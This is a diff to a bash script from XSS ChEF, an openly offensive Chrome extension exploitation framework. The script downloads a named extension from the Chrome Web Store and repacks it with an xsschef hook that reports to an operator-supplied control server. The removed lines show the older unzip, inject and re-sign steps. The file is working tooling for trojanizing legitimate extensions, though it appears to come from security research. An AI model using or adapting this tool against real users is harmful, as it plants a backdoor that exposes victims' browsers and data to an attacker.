@@ -1,6 +1,4 @@
 #!/usr/bin/env bash
-# Usage:
-# ./repacker.sh <file.crx> <new.crx> <xsschef-server-url> <hook-name>
 #   XSS ChEF - Chrome Extension Exploitation framework
 #    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net
 #
@@ -16,39 +14,33 @@
 #
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <http://www.gnu.org/licenses/>.
-DIR=$( cd "$( dirname "$0" )" && pwd )
-source $DIR/config.ini
+#
+# Usage:
+# ./repacker-webstore.sh <extension-id> <xsschef-server-url>
+#
+# Will download extension from Google Chrome Webstore and replace
+# the .crx file with a version with xsschef embedded.
 RUNDIR=`pwd`
+DIR=$( cd "$( dirname "$0" )" && pwd )
+URL="https://clients2.google.com/service/update2/crx?response=redirect&x=id%3D${1}%26lang%3Dpl%26uc"
 tempfoo=`basename $0`
 TMPDIR=`mktemp -d -t ${tempfoo}` || exit 1
-EXTDIR="$TMPDIR"
 
 function cleanup {
     rm -rf "$TMPDIR"
+    cd "$RUNDIR"
 }
 
 function bailout {
+    echo "Error"
     cleanup
     exit 1
 }
 
-if [ ! -x "$CHROMEPATH" ]; then
-    echo "You must set correct CHROMEPATH in tools/config.ini" >&2
+curl -L "$URL" -o "$TMPDIR/org.crx"
+if (( $? )) ; then 
     bailout
 fi
-
-echo "Unpacking $1..."
-unzip -qo "$1" -d "$EXTDIR"
-echo "Injecting xsschef..."
-$DIR/inject-xsschef.php "$EXTDIR" "$3" "$4" || bailout
-
-echo "Signing $EXTDIR..."
-"$CHROMEPATH" --pack-extension=$EXTDIR --no-message-box
-if (( $? )) ; then 
- echo "Signing in Chrome FAILED.\n" >&2
- bailout
-fi
-
-echo "Moving signed extension to $2"
-mv "`dirname "$EXTDIR"`/`basename "$EXTDIR"`.crx" $2
-cleanup
+$DIR/repacker.sh "$TMPDIR/org.crx" "new.crx" "$2" repack || bailout 
+rm $TMPDIR/org.crx
+echo "new.crx"
